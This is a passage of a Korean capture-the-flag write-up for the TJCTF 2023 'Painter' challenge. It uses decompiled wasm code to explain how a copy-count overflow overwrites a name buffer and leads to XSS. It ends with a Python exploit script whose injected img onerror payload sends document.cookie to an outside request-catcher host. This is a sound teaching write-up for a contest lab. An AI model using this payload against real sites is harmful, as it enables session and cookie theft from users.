+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">5</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span> ;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>      };
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2091c</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_14 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> local_18));
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2091c</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_14 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>)));
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2091c</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_14 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2</span>)));
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2091c</span>) <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0xff</span> <span style="color:#f92672">-</span> (<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_14 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3</span>))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)); <span style="color:#75715e">// 4번째 -&gt; 0xff 뺴기
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      local_18 <span style="color:#f92672">=</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span> ;
+</span></span><span style="display:flex;"><span>    };
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((((local_18 <span style="color:#f92672">&lt;</span> (<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x24924</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>;
+</span></span></code></pre></div><p>count를 overflow로 덮어서 얼마나 copy할지를 컨트롤 할 수 있다.<br>
+이때 Layer(0x2091c + 0x1008)가 pixels(0x2091c)로 4 바이트씩 copy된다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((((local_10 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x3</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>          label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_10 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3</span>))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">6</span>;
+</span></span><span style="display:flex;"><span>            local_14 <span style="color:#f92672">=</span> local_10;
+</span></span></code></pre></div><p>여기 if문에서 local_14가 0이 아니게 되어버리면, &laquo; 0xc 때문에 0x1000 단위로 커져버린다.<br>
+여기서 if문을 안타고 들어가게 하려면 local_18은 증가하게 냅두고 그냥 payload를 넉넉하게 채우면 우회할 수 있다.</p>
+<pre tabindex="0"><code>0x24924 -&gt; count // while loop copy cnt
+0x21924 -&gt; Layers
+0x2191c -&gt; Name 
+0x2091c -&gt; pixels
+Updated every tick
+0x2091c = 0x21924
+</code></pre><p>이때 적절한 count로 덮고 copy를 통해서 pixels에서 Name을 덮어버리면 나중에 loop에서 index.html의 setName을 호출해서 tick 마다 Name을 업데이트한다.<br>
+<img loading="lazy" src="/blog/TJCTF_2023_Painter/image-2.png" alt=""  />
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">setName</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">UTF8ToString</span>(<span style="color:#a6e22e">_getName</span>());
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;name-h1&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2091c</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_14 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2</span>)));
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2091c</span>) <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0xff</span> <span style="color:#f92672">-</span> (<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_14 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>)) <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3</span>))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)); <span style="color:#75715e">// 4번째 -&gt; 0xff 뺴기
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      local_18 <span style="color:#f92672">=</span> (local_18 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span> ;
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fimport_emscripten_run_script</span>(<span style="color:#ae81ff">0x14fac</span> <span style="color:#75715e">/* &#34;setName()&#34; */</span> );
+</span></span></code></pre></div><p>원래 flask 템플릿에서 막혀서 xss를 트리거할 수 없을텐데 Name을 덮고 wasm 단에서 바꾸게 해버리면 xss를 트리거할 수 있다.</p>
+<h3 id="exploit-script">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> p8,p16
+</span></span><span style="display:flex;"><span>BASE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://painter.tjc.tf&#39;</span>
+</span></span><span style="display:flex;"><span>attackerURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://qivuygm.request.dreamhack.games&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x24924 -&gt; count // while loop copy cnt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x21924 -&gt; Layers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x2191c -&gt; Name 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x2091c -&gt; pixels
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Updated every tick
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x2091c = 0x21924
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>injection <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;img src=@ onerror=window.location=&#39;</span><span style="color:#e6db74">{</span>attackerURL<span style="color:#e6db74">}</span><span style="color:#e6db74">?flag=&#39;+document.cookie&gt;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">paygen</span>(string : bytes):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 &lt;&lt; 0xc)) + local_18));
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 &lt;&lt; 0xc)) + (local_18 + 0x1)));
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 &lt;&lt; 0xc)) + (local_18 + 0x2)));
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 &lt;&lt; 0xc)) + (local_18 + 0x3))) &amp; 0xff)); // 4번째 -&gt; 0xff 뺴기
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(string)):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            pay <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">0xff</span><span style="color:#f92672">-</span>string[i])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            pay <span style="color:#f92672">+=</span> p8(string[i])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pay
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x2191c</span><span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2091c</span>)
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> paygen(injection<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> ((<span style="color:#ae81ff">0x24924</span><span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21924</span>)<span style="color:#f92672">-</span>len(pay))
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># pixels overflow </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">export &#34;copyCanvas&#34;; // $func239 is exported to &#34;copyCanvas&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">void $func6(int target, int length) {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  // offset=0xc
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  int t;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  // offset=0x8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  int l;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  t = target;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  l = length;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  $memcpy((0x2091c + 0x1008), t, l); // 0x21924 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  $free(t);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  return;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            const bin = base64ToArr(px); // get img binary
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            const arr = arrToCharArr(bin); 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            _copyCanvas(arr, bin.length);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">0x1000</span><span style="color:#f92672">+</span>len(injection)<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x70</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(pay[0x1000:0x1030])</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(hex(pay[0x3000]),hex(pay[0x3001]))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(hex(len(pay)))</span>
+</span></span><span style="display:flex;"><span>re <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>BASE_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/save&#39;</span>, json<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;img&#39;</span>: base64<span style="color:#f92672">.</span>b64encode(pay)<span style="color:#f92672">.</span>decode(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#39;exploit&#39;</span>
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>print(re<span style="color:#f92672">.</span>url)
+</span></span></code></pre></div><p>admin bot한테 url주고 돌리면 flag 나온다.<br>
+<img loading="lazy" src="/blog/TJCTF_2023_Painter/image-1-1.png" alt=""  />
+<br>
+<code>tjctf{m0n4_l1s4_1s_0verr4t3d_e2187c9a}</code></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://msh1307.kr/tags/tjctf_2023/">TJCTF_2023</a></li>
+      <li><a href="https://msh1307.kr/tags/tjctf_2023-painter/">TJCTF_2023 Painter</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
